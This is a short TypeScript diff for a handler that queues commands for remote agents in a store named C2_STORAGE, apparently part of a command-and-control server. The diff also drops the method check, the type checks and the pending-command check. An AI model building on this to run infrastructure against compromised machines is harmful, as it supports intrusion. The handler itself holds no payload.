@@ -1,18 +1,13 @@
-import { requireAdmin } from "../core/auth"
 import { json, error } from "../core/response"
-import { getCommand, createCommand } from "../storage/commands"
+import { requireAdmin } from "../core/auth"
 
 export async function issueCommand(
   request: Request,
   env: Env
 ): Promise<Response> {
 
-  const authError = requireAdmin(request, env)
-  if (authError) return authError
-
-  if (request.method !== "POST") {
-    return error("Method Not Allowed", 405)
-  }
+  const auth = requireAdmin(request, env)
+  if (auth) return auth
 
   let body: { agentId?: string; command?: string }
 
@@ -22,35 +17,19 @@ export async function issueCommand(
     return error("Invalid JSON", 400)
   }
 
-  if (
-    !body.agentId ||
-    typeof body.agentId !== "string" ||
-    !body.command ||
-    typeof body.command !== "string"
-  ) {
-    return error("Invalid payload", 400)
+  if (!body.agentId || !body.command) {
+    return error("Missing fields", 400)
   }
 
-  const existing = await getCommand(env.C2_STORAGE, body.agentId)
-  if (existing) {
-    return error(
-      "Agent already has a pending command",
-      409
-    )
-  }
+  const commandId = crypto.randomUUID()
 
-  const cmd = {
-    id: crypto.randomUUID(), // ✅ Web Crypto
-    agentId: body.agentId,
-    command: body.command,
-    createdAt: new Date().toISOString(),
-    status: "queued" as const
-  }
+  await env.C2_STORAGE.put(
+    `cmd:${body.agentId}`,
+    JSON.stringify({
+      id: commandId,
+      command: body.command
+    })
+  )
 
-  await createCommand(env.C2_STORAGE, cmd)
-
-  return json({
-    ok: true,
-    commandId: cmd.id
-  })
+  return json({ ok: true, commandId })
 }
